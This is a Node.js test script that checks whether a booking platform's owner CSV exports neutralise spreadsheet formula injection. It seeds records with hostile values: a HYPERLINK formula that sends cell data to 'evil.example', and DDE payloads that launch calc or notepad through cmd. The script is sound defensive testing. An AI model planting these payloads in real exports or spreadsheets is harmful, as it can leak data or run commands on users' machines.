// Proposal 6 acceptance check: owner CSV downloads neutralise spreadsheet formulas.
// Calls the real netlify/functions/client.mjs handler (legacy owner GET ?c=&k=&export=…) for bookings, leads,
// customers and conversations. Records are saved through the real lib/desk.mjs bookVisit/flagLead and
// lib/store.mjs saveConversation, with hostile values in the name, issue, address, notes and message fields.
// Memory store, fake model, empty provider env (sends only log), no network.
// Each downloaded CSV is parsed. The check asserts:
//   - every hostile value is present, prefixed with an apostrophe (same rule as lib/intake.mjs csvCell);
//   - no cell starts (after optional whitespace) with = + - @, or with a tab or CR, unless it is a plain
//     signed number;
//   - the E.164 phone "+17135550123" is exported unchanged (still usable for imports).
// Usage: node csv-injection-check.mjs [--repo <repo root>] [--output <new json path>]
// Expected: FAILS on dfb0ae78, PASSES with 06-csv-formula-guard.patch.
import { resolve } from "node:path";
import { pathToFileURL } from "node:url";
import { existsSync, writeFileSync } from "node:fs";
import { syncBuiltinESMExports } from "node:module";
import net from "node:net"; import http from "node:http"; import https from "node:https";

const arg = (name) => { const i = process.argv.indexOf(name); return i < 0 ? null : process.argv[i + 1]; };
const repo = resolve(arg("--repo") || resolve(import.meta.dirname, "../../.."));
const output = arg("--output");
if (output && existsSync(output)) throw new Error("Choose a new output path: " + output);
let netAttempts = 0; const deny = () => { netAttempts++; throw new Error("csv-injection-check denies networking"); };
net.connect = net.createConnection = http.request = http.get = https.request = https.get = deny; syncBuiltinESMExports();
globalThis.fetch = async () => deny();
for (const key of Object.keys(process.env)) if (/^(ANTHROPIC|TWILIO|VAPI|RESEND|GOOGLE|STRIPE|MC_TWILIO|MC_MESSAGING|STEVE_|ADMIN_KEY|DEPLOY_|URL$)/.test(key)) delete process.env[key];
Object.assign(process.env, { MC_MEMORY_STORE: "1", MC_FAKE_MODEL: "1", NODE_ENV: "test", URL: "https://platform.example.test" });
console.log = ((log) => (...a) => { if (!/^\[(sms|email):disabled\]/.test(String(a[0]))) log(...a); })(console.log);

const F = (p) => pathToFileURL(resolve(repo, "netlify/functions", p)).href;
const store = await import(F("lib/store.mjs"));
const cfg = await import(F("lib/config.mjs"));
const desk = await import(F("lib/desk.mjs"));
const client = (await import(F("client.mjs"))).default;

const c = cfg.newClient({ slug: "csv-check", ownerKey: "csv-owner-key", owner: { name: "Ray", phone: "", email: "" }, business: { name: "Bayou Air", trade: "HVAC", hours: "Mon-Sun 7am-7pm" } });
Object.assign(c, { status: "live", windows: ["8 to 12", "12 to 5"] }); c.rules.windowCapacity = 20;
await store.saveClient(c);
const day = new Date(Date.now() + 3 * 86400000).toISOString().slice(0, 10);
const HOSTILE = {
  name: '=HYPERLINK("https://evil.example/?x="&A1,"Click")',
  issue: "@SUM(1+1)",
  address: "-2+3",
  notes: " =cmd|' /C calc'!A0",
  unsure: "+cmd|' /C notepad'!A0",
  tab: "\t=1+1",
  cr: "\r=1+1",
};
const PHONE = "+17135550123";
await desk.bookVisit(c, { customer_name: HOSTILE.name, phone: PHONE, address: HOSTILE.address, issue: HOSTILE.issue, date: day, window: "8 to 12", urgency: "this_week", language: "en", notes: HOSTILE.notes, unsure: HOSTILE.unsure }, { channel: "web", contact: "wcsv1" });
await desk.flagLead(c, { customer_name: HOSTILE.name, phone: "+17135550124", address: HOSTILE.address, issue: HOSTILE.issue, reason: "lead", urgency: "flexible", wanted: HOSTILE.tab, language: "en", nobook_reason: "none", unsure: HOSTILE.cr }, { channel: "web", contact: "wcsv2" });
const conv = await store.getConversation(c, "web", "wcsv3");
// Messages are stored verbatim (no trim), so leading space, tab and CR reach the export unchanged.
for (const content of [HOSTILE.name, HOSTILE.notes, HOSTILE.tab, HOSTILE.cr, "-2+3", PHONE]) conv.messages.push({ role: "user", content, at: new Date().toISOString() });
await store.saveConversation(conv);

function parseCSV(text) {
  const rows = []; let row = [], cell = "", q = false; text = text.replace(/^﻿/, "");
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (q) { if (ch === '"') { if (text[i + 1] === '"') { cell += '"'; i++; } else q = false; } else cell += ch; }
    else if (ch === '"') q = true; else if (ch === ",") { row.push(cell); cell = ""; }
    else if (ch === "\r" && text[i + 1] === "\n") { row.push(cell); rows.push(row); row = []; cell = ""; i++; }
    else cell += ch;
  }
  if (cell || row.length) { row.push(cell); rows.push(row); }
  return rows;
}
const PLAIN_NUMBER = /^[+-]?\d+(?:\.\d+)?$/;
const dangerous = (v) => !PLAIN_NUMBER.test(v) && (/^\s*[=+\-@]/.test(v) || /^[\t\r]/.test(v));
const results = [];
for (const what of ["bookings", "leads", "customers", "conversations"]) {
  const res = await client(new Request(`https://platform.example.test/api/client?c=csv-check&k=csv-owner-key&export=${what}`));
  const text = await res.text(); const rows = res.status === 200 ? parseCSV(text) : [];
  const cells = rows.slice(1).flat();
  const problems = [];
  if (res.status !== 200) problems.push("status " + res.status + " " + text.slice(0, 120));
  const live = cells.filter(dangerous);
  if (live.length) problems.push(`${live.length} cell(s) start like a formula: ${live.map((v) => JSON.stringify(v)).join(", ")}`);
  // bookVisit/flagLead trim fields on save (lib/desk.mjs:39 esc), so their expected stored form is trimmed.
  const expected = { bookings: ["name", "issue", "address", "notes", "unsure"], leads: ["name", "issue", "address", "tab", "cr"], customers: ["name"], conversations: ["name", "notes", "tab", "cr"] }[what];
  for (const k of expected) {
    const neutral = "'" + (what === "conversations" ? HOSTILE[k] : HOSTILE[k].trim());
    const found = what === "customers" ? cells.some((v) => v.startsWith("'=HYPERLINK")) : cells.includes(neutral);
    if (!found) problems.push(`hostile ${k} not exported as ${JSON.stringify(neutral).slice(0, 40)}…`);
  }
  if (what !== "leads") if (!cells.includes(PHONE)) problems.push("phone " + PHONE + " not exported unchanged");
  if (what === "conversations" && !cells.includes("'-2+3")) problems.push("'-2+3' message not neutralised");
  results.push({ export: what, status: res.status, rows: rows.length - 1, pass: problems.length === 0, problems, sample: rows.slice(0, 3) });
}
for (const r of results) console.log(`${r.pass ? "ok  " : "FAIL"} ${r.export.padEnd(13)} rows=${r.rows}${r.pass ? "" : "\n       " + r.problems.join("\n       ")}`);
const failed = results.filter((r) => !r.pass).length;
const summary = { check: "csv-injection-check", repo, exports: results.length, failed, netAttempts, result: failed || netAttempts ? "FAIL" : "PASS" };
console.log(JSON.stringify(summary));
if (output) writeFileSync(output, JSON.stringify({ summary, results }, null, 2));
process.exit(summary.result === "PASS" ? 0 : 1);
